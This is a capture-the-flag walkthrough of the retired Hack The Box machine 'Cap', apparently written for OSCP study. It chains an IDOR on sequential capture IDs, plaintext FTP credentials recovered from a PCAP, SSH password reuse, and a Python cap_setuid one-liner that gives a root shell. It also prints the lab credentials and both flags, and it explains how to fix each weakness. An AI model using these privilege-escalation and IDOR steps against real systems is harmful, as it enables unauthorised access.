# HTB Cap — IDOR, Plaintext FTP Creds, and the Danger of Linux Capabilities

**Hack The Box | Easy | Linux | Retired**

---

If you're new to Hack The Box or prepping for OSCP, Cap is the box you want to do early. Not because it's flashy — it isn't. No exotic CVEs, no complex buffer overflows. Just three fundamental misconfigurations chained together cleanly:

1. An **IDOR vulnerability** on a web app storing network captures with sequential, predictable IDs
2. **Plaintext FTP credentials** leaking inside a packet capture
3. A **Linux capability misconfiguration** (`cap_setuid` on Python) that gives instant root

These aren't niche CTF tricks. IDOR is in the OWASP Top 10. FTP is still running on production networks in 2026. Linux capabilities are regularly misconfigured. Cap teaches you to recognize all three.

---

## Recon

Start with nmap — always.

```bash
nmap -sC -sV -oN nmap_services.txt 10.129.12.255
nmap -p- --min-rate 10000 -oN nmap_allports.txt 10.129.12.255
```

Three ports open:

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | FTP (vsftpd 3.0.3) | Anonymous login disabled |
| 22/tcp | SSH (OpenSSH 8.2p1) | Target once we have credentials |
| 80/tcp | HTTP (Gunicorn) | Python WSGI app — main attack surface |

FTP with anonymous login disabled means nothing to do there without credentials. SSH is a waiting room. The web app is where we start.

---

## Enumeration

### The Web App

Port 80 serves what calls itself a **"Security Dashboard"** — ironic, given what we're about to do to it. It has three sections: IP Config, Network Status, and a `/capture` endpoint that runs a 5-second live packet capture on the server.

The capture flow works like this:

1. Browse to `/capture`
2. The server captures 5 seconds of network traffic, saves it to disk
3. Redirects you to `/data/<id>` — where `<id>` is a sequential integer starting at 1
4. File is downloadable at `/download/<id>`

Two things jump out immediately:

**First:** The nav bar shows the logged-in username — `nathan`. Free username, no brute force required.

**Second:** Sequential integer IDs on a resource endpoint with no visible access control. That's IDOR waiting to be tested.

### Testing for IDOR

After triggering a capture, the app redirects to `/data/1`. The obvious question: what's at `/data/0`?

```bash
curl http://10.129.12.255/data/0
```

It returns a valid page with a download link for `/download/0`. No authentication error. No ownership check. Just... the file.

This is a capture from the box's own setup — created before any player connected, containing real traffic from the server's initialization. We can download it freely because the app never checks whether the resource belongs to the requesting user.

> **IDOR in the real world:** Insecure Direct Object References show up constantly in bug bounties and internal assessments. The pattern is always the same — a resource ID in a URL, no server-side ownership validation. The fix is always the same too: check on the server that the authenticated user owns the object they're requesting. Never trust the client to only ask for what they're allowed to see.

---

## Foothold

### Cracking Open the PCAP

```bash
wget http://10.129.12.255/download/0 -O capture0.pcap
tcpdump -r capture0.pcap -A | grep -A5 "USER\|PASS"
```

Inside the PCAP is an FTP session. FTP sends everything in plaintext over TCP — the handshake, the commands, the credentials. All of it. The capture caught the server authenticating to its own FTP service during setup:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

Credentials recovered without touching a wordlist or running a single exploit.

> **Why FTP is still dangerous:** FTP has existed since 1971 and has never had transport encryption. Every byte — including your username and password — travels as readable ASCII. SFTP and FTPS exist precisely because of this. In internal network assessments, being on the same network segment as FTP traffic, or finding a PCAP that captured it, is frequently enough to gain initial access. If you're doing an internal pentest and you see port 21 open on a server, start sniffing.

### SSH as Nathan

Password reuse. The FTP credentials work directly on SSH:

```bash
ssh nathan@10.129.12.255
# Password: Buck3tH4TF0RM3!
```

Shell as `nathan`. User flag:

```
user.txt: ea34748abba367e85ac0aec4f9932bad
```

---

## Privilege Escalation

### Enumeration

`sudo -l` — nothing. No SUID binaries worth pursuing. Time to check **Linux capabilities**:

```bash
getcap -r / 2>/dev/null
```

Output:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

There it is.

### Understanding cap_setuid

Linux capabilities are a deliberate design choice — they allow granting specific privileges to a process without making it fully root. The idea is fine-grained access control: give a web server the ability to bind to port 80 (`cap_net_bind_service`) without giving it full administrative access.

`cap_setuid` lets a process call `setuid()` to **change its effective user ID to any UID on the system — including UID 0, which is root**.

When this capability is attached to an interpreter like Python, it means anyone who can run that interpreter can invoke `setuid(0)` from inside a script. No password. No sudo. No exploit. The OS hands you root because the binary is marked as allowed to ask for it.

This is documented on [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) and comes up regularly in CTFs and real assessments. Admins sometimes set capabilities thinking it's a safer alternative to sudo — but `cap_setuid` on any general-purpose interpreter is functionally equivalent to unrestricted root access.

### Exploitation

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Breaking it down:
- `os.setuid(0)` — changes the process's UID to 0 (root), permitted because `cap_setuid` is set on `/usr/bin/python3.8`
- `os.system('/bin/bash')` — spawns a bash shell that inherits the root UID

Root shell. Instant.

```
root.txt: 3a0175a10c1007605d6b3813fb2cb37b
```

---

## Full Attack Chain

```
nmap
  └─ port 80 (Gunicorn web app)
       └─ /capture → IDOR on /data/0
            └─ download PCAP
                 └─ tcpdump → FTP creds (plaintext)
                      └─ ssh as nathan (password reuse)
                           └─ getcap -r /
                                └─ cap_setuid on python3.8
                                     └─ setuid(0) → root
```

---

## Key Takeaways

**1. Always fuzz sequential IDs.**
When you see `/data/1` or `/item/42` in a URL, the first thing you test is `/data/0`, `/data/2`, and IDs belonging to other users. If the app doesn't enforce ownership server-side, you have IDOR. This is one of the highest-yield, lowest-effort checks in web app testing.

**2. FTP is a credential gift.**
Anonymous login disabled doesn't mean FTP is useless. If you can capture traffic (via a PCAP, MITM position, or a misconfigured network tap), FTP credentials come out in plaintext. Always check port 21 on internal assessments and look for PCAPs anywhere on the filesystem.

**3. Password reuse is the rule, not the exception.**
One set of leaked credentials should always be tried on every other service: SSH, RDP, VPN, admin panels. Nathan's FTP password working on SSH is cliché in CTFs because it's realistic. Password reuse is endemic.

**4. `getcap -r /` belongs on your privesc checklist.**
Run it right after `sudo -l`. `cap_setuid` on any interpreter (Python, Perl, Ruby, Node) is root. GTFOBins has one-liners for all of them.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scan and service fingerprinting |
| `curl` / browser | Web app enumeration, IDOR testing |
| `wget` | Download the vulnerable PCAP |
| `tcpdump` | Parse PCAP and extract plaintext FTP credentials |
| `ssh` | Initial access with recovered credentials |
| `getcap` | Identify Linux capability misconfigurations |
| `python3` | Exploit `cap_setuid` for root shell |

---

## References

- [GTFOBins — Python capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [OWASP — IDOR Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for-Insecure_Direct_Object_References)
- [Linux Capabilities — man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [FTP Protocol — RFC 959](https://datatracker.ietf.org/doc/html/rfc959)

---

*I'm working through HTB machines as part of my OSCP prep. Follow along for writeups, notes, and lessons learned — one machine at a time.*

*Target: OSCP by early 2027. Current: building the reps.*
